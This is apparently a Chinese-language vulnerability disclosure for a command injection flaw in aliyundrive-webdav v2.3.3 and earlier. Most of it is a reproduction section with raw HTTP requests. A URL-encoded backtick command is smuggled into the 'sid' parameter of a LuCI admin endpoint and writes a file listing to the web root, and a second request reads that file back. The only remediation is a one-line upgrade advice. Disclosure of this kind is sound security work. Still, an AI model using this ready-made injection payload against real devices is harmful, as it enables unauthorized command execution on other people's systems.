**漏洞名称**

aliyundrive-webdav 命令注入漏洞

02

**漏洞影响**

aliyundrive-webdav v.2.3.3及以下版本

开源地址

https://github.com/messense/aliyundrive-webdav

03

**漏洞描述**

阿里云盘 WebDAV 服务，主要使用场景为配合支持 WebDAV 协议的客户端 App 如 Infuse、nPlayer 等实现在电视上直接观看云盘视频内容， 支持客户端 App 直接从阿里云盘获取文件播放而不经过运行本应用的服务器中转, 支持上传文件，但受限于 WebDAV 协议不支持文件秒传。该系统v.2.3.3及以下版本存在漏洞，容易受到命令注入攻击。

**漏洞复现**

第一步，注入命令ls />/www/123.txt

```yaml
GET /cgi-bin/luci/admin/services/aliyundrive-webdav/query?sid=%60%6c%73%20%2f%3e%2f%77%77%77%2f%31%32%33%2e%74%78%74%60 HTTP/1.1
Host: 192.168.32.129
Cookie: sysauth=41273cb2cffef0bb5d0653592624cf64
Sec-Ch-Ua: "Chromium";v="122", "Not(A:Brand";v="24", "Microsoft Edge";v="122"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://192.168.32.129/cgi-bin/luci/admin/services/aliyundrive-webdav/client
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

```

```yaml

GET /123.txt HTTP/1.1
Host: 192.168.32.129
Cookie: sysauth=41273cb2cffef0bb5d0653592624cf64
Sec-Ch-Ua: "Chromium";v="122", "Not(A:Brand";v="24", "Microsoft Edge";v="122"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://192.168.32.129/cgi-bin/luci/admin/services/aliyundrive-webdav/client
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

```

**修复建议**



升级到最新版本。